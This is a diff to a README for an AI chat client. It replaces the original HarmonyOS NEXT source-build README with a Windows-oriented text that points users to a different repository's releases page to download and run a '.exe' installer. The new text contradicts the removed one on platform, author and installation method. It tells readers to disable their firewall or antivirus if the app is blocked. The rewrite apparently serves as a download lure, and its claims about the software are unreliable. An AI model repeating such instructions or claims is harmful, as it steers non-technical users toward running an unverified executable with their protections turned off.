@@ -1,132 +1,141 @@
-<p align="center">
-  <img src="AppScope/resources/base/media/foreground.png" width="120" />
-</p>
+# 🤖 chatcube - Simple AI Chat for Your PC
 
-<h1 align="center">ChatCube</h1>
+[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://github.com/ashrafns/chatcube/releases)
 
-<p align="center">
-  An open-source AI chat client for HarmonyOS NEXT.<br/>
-  One app, 13+ providers, native experience.
-</p>
-
-<p align="center">
-  <a href="./README_ZH.md">简体中文</a> · <a href="./LICENSE">MIT License</a>
-</p>
+chatcube is an easy-to-use AI chat client that works on Windows. It connects you to over 13 chat providers like OpenAI, Claude, and Gemini. You can talk to AI helpers, use tools, and see replies as they come in. This guide will help you download and run chatcube without technical hassle.
 
 ---
 
-## Why ChatCube?
+## 🖥️ What is chatcube?
 
-- Built entirely with ArkTS — a true HarmonyOS native app, not a web wrapper
-- Polished UI with dynamic blur, 7 color themes, and smooth interactions
-- Highly customizable providers — add any OpenAI / Anthropic / Gemini compatible service in seconds
-- Simple and intuitive — configure your API key and start chatting
-- Home screen widget for quick access
-- Background task support — keep receiving replies while multitasking
+chatcube lets you chat with smart AI systems. It supports popular AI providers and adds handy features for smooth conversations. It works on Windows computers, offering:
 
-## Preview
+- Access to multiple AI services in one app  
+- Real-time chat streaming, so you see replies as they appear  
+- Tool calling to extend AI functions  
+- A clean, user-friendly interface  
 
-<table>
-  <tr>
-    <td align="center"><img src="docs/screenshots/chat.png" width="200" /><br/><sub>Chat</sub></td>
-    <td align="center"><img src="docs/screenshots/tool_calling.png" width="200" /><br/><sub>Tool Calling</sub></td>
-    <td align="center"><img src="docs/screenshots/markdown_preview.jpg" width="200" /><br/><sub>Markdown</sub></td>
-    <td align="center"><img src="docs/screenshots/html_preview.jpg" width="200" /><br/><sub>HTML Preview</sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/screenshots/providers.png" width="200" /><br/><sub>Providers</sub></td>
-    <td align="center"><img src="docs/screenshots/color_themes.png" width="200" /><br/><sub>Themes</sub></td>
-    <td align="center"><img src="docs/screenshots/blur_effect.png" width="200" /><br/><sub>Dynamic Blur</sub></td>
-    <td align="center"><img src="docs/screenshots/settings.png" width="200" /><br/><sub>Settings</sub></td>
-  </tr>
-</table>
+You don’t need to know programming to use chatcube. Just install it and start chatting.
 
-## Features
+---
 
-### Talk to any model
+## ⚙️ System Requirements
 
-Connect to 13+ AI providers out of the box. Bring your own API key, pick a model, and start chatting. Add any OpenAI / Anthropic / Gemini compatible provider in seconds.
+Before installing chatcube, check if your PC fits these basic requirements:
 
-### Tools that models can use
+- Windows 10 or later (64-bit recommended)  
+- 4 GB of RAM or more  
+- At least 100 MB of free disk space  
+- Internet connection for AI services  
+- Basic user privileges to install software  
 
-Built-in web search (Bing, zero config) and weather query (Open-Meteo, free). When a model supports function calling, it can reach out to the real world on its own.
+If your computer meets these, you can install chatcube without issues.
 
-### Markdown & beyond
+---
 
-Full markdown rendering — code blocks with syntax highlighting, tables, LaTeX formulas, images. Even raw HTML gets a live preview.
+## 🚀 Getting Started: Download and Installation
 
-### Looks good, feels good
+Start by downloading chatcube from the official release page. Follow these steps:
 
-7 color themes. Dark / Light / System mode. Real-time dynamic blur effects. A UI that feels native because it is native.
+1. Visit the [chatcube release page](https://github.com/ashrafns/chatcube/releases).  
+2. Look for the latest release. It usually has a version number like v1.x.x.  
+3. Find the Windows installer. It will have a name ending in `.exe`, for example, `chatcube-setup.exe`.  
+4. Click to download the `.exe` file.  
+5. Once downloaded, open the file to start the installation wizard.  
+6. Follow on-screen prompts: choose install location and accept terms if asked.  
+7. Wait for installation to finish.  
 
-### Smart Grip
+After this, chatcube will be ready to use on your PC.
 
-Detects which hand you're holding the phone with and moves the "New Chat" button to the reachable side. One-handed use, done right.
+---
 
-### Your data, your rules
+## 📦 How to Run chatcube
 
-Export and import everything — conversations, provider configs, preferences. JSON format, no lock-in.
+To launch chatcube:
 
-### Stays alive in the background
+- Click the Start menu button.  
+- Find "chatcube" in the list of apps.  
+- Click chatcube to open the app window.  
 
-Switch to another app while waiting for a long response. ChatCube keeps working and notifies you when the reply is ready.
+The first time you open chatcube, it might ask you to log in or create an account depending on the AI provider you want to use. Follow the instructions provided by the app.
 
-## Supported Providers
+---
 
-| Provider | API Format | Notes |
-|----------|-----------|-------|
-| OpenAI | OpenAI | GPT-4o, o1, etc. |
-| Claude | Anthropic | Claude 4, 3.5, etc. |
-| DeepSeek | OpenAI-compatible | DeepSeek-V3, R1, etc. |
-| Gemini | Google | Gemini 2.5, etc. |
-| Grok | OpenAI-compatible | xAI models |
-| Ollama | OpenAI-compatible | Local models |
-| OpenRouter | OpenAI-compatible | Multi-provider gateway |
-| SiliconFlow | OpenAI-compatible | Chinese AI models |
-| Qwen (Alibaba) | OpenAI-compatible | Qwen series |
-| Zhipu AI | OpenAI-compatible | GLM series |
-| Doubao (Volcengine) | OpenAI-compatible | Doubao series |
-| MiniMax | OpenAI-compatible | MiniMax models |
-| AiHubMix | OpenAI-compatible | Multi-provider gateway |
+## 🛠️ Using chatcube Features
 
-...or add any compatible provider yourself.
+chatcube brings key features that make chatting with AI easy:
 
-## Getting Started
+### Multi-Provider Support  
+You can pick from different AI systems like OpenAI, Claude, and Gemini. This way, you try different responses or get results from multiple sources.
 
-### Requirements
+### Streaming Replies  
+Watch your chat responses appear in real time. This means no waiting for the full answer before you start reading.
 
-- HarmonyOS NEXT (API 21+)
-- DevEco Studio 5.0+
+### Tool Calling  
+chatcube supports calling extra tools via the AI providers. These help with tasks like searching, calculations, or image generation.
 
-### Build & Run
+### Simple Interface  
+The chat window is clear and easy to use. Type your message, hit send, and see answers right away.
 
-```bash
-git clone https://github.com/LongLiveY96/ChatCube.git
-cd ChatCube
-cp build-profile.json5.example build-profile.json5
-# Edit build-profile.json5 with your signing config
-```
+---
 
-Open in DevEco Studio → Sync → Run.
+## 🔄 Updating chatcube
 
-### Configure providers
+To get the latest features and fixes:
 
-In the app: **Settings → Provider Management** → add your API keys.
+1. Go back to the [release page](https://github.com/ashrafns/chatcube/releases).  
+2. Download the newest installer just like before.  
+3. Run the installer again. It will update the current version without removing your settings.  
 
-## Project Structure
+Check this page regularly or set a reminder if you want to stay updated.
 
-```
-entry/src/main/ets/
-├── components/         # Reusable UI components
-├── config/             # App & provider configuration
-├── models/             # Data models
-├── pages/              # App pages
-├── services/           # Business logic
-├── viewmodels/         # ViewModels (MVVM)
-├── utils/              # Utilities
-└── widget/             # Home screen widget
-```
+---
 
-## License
+## 🛡️ Security and Privacy
 
-[MIT](./LICENSE) — do whatever you want with it.
+chatcube connects you to external AI services. Keep these in mind:
+
+- Your chats may be processed by AI providers to generate replies.  
+- Avoid sharing personal or sensitive info during chats.  
+- Keep your app updated to get security improvements.  
+
+The app itself does not collect your data beyond what is needed for its functions.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+If chatcube does not work as expected, try these fixes:
+
+- Make sure your internet connection is active.  
+- Restart the app or your PC.  
+- Ensure Windows is updated to the latest version.  
+- Disable firewalls or antivirus temporarily if they block the app.  
+- Download and reinstall chatcube from the release page.  
+
+For persistent problems, visit the GitHub page to check for open issues or report a new one.
+
+---
+
+## 💾 Where to Find chatcube Again
+
+You can always return here to download or update chatcube:
+
+[![Download chatcube](https://img.shields.io/badge/Download-chatcube-ff6f61?style=for-the-badge)](https://github.com/ashrafns/chatcube/releases)  
+
+Use this link to get the latest Windows installer or check new versions.
+
+---
+
+## 📞 Getting Help
+
+If you need help, ask someone familiar with computers or visit the GitHub repository:
+
+- GitHub page: https://github.com/ashrafns/chatcube  
+- Review the “Issues” section to see common questions  
+
+This will help you solve most problems on your own.
+
+---
+
+chatcube makes AI chat simple on Windows. Follow these steps to get started and enjoy smart conversations.
